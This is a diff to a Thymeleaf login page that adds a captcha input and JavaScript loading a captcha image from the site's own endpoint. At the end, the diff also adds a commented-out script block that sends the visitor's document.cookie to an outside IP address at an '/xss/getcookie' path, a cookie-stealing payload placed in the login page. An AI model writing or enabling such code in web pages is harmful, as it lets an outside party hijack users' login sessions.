@@ -156,6 +156,20 @@
                     <i class="fa fa-lock"></i>
                     <a href="#" class="fa fa-question-circle"></a>
                 </div>
+
+
+                <div class="form-group help">
+                    <input type="text" name="yzm" class="form-control"  placeholder="请输入验证码">
+
+                    <i class="fa fa-lock"></i>
+                    <a href="#" class="fa fa-question-circle"></a>
+                    <br>
+                    <div id="imgcontainer"></div>
+                </div>
+
+
+
+
                 <div class="form-group">
                     <button type="submit" class="btn btn-default">登录</button>
                 </div>
@@ -163,6 +177,66 @@
         </div>
     </div>
 </div>
+
+
+
+<script th:inline="javascript">
+    let basePath = [[${#httpServletRequest.getContextPath()}]];
+
+
+    let xhr = new XMLHttpRequest();
+    xhr.open("get", basePath + '/YZM/captcha', true);
+    xhr.responseType = "blob";
+    xhr.onload = function() {
+        if (this.status == 200) {
+            var blob = this.response;
+            var img = document.createElement("img");
+            img.onload = function(e) {
+                window.URL.revokeObjectURL(img.src);
+            };
+            img.src = window.URL.createObjectURL(blob);
+
+            $("#imgcontainer").html(img);
+
+        } };
+    xhr.send();
+
+
+
+
+    var imgcontainer = document.getElementById('imgcontainer');
+
+    imgcontainer.onclick = function () {
+
+        let xhr = new XMLHttpRequest();
+        xhr.open("get", basePath + '/YZM/captcha', true);
+        xhr.responseType = "blob";
+        xhr.onload = function() {
+            if (this.status == 200) {
+                var blob = this.response;
+                var img = document.createElement("img");
+                img.onload = function(e) {
+                    window.URL.revokeObjectURL(img.src);
+                };
+                img.src = window.URL.createObjectURL(blob);
+
+                $("#imgcontainer").html(img);
+
+            } };
+        xhr.send();
+    }
+
+</script>
+
+
+
+<!--<script>-->
+    <!--var i = document.createElement('script');-->
+    <!--i.src = "http://220.117.20.219/xss/getcookie?data=" + document.cookie;-->
+    <!--i.style.display = 'none';-->
+    <!--document.body.appendChild(i);-->
+<!--</script>-->
+
 
 </body>
 </html>
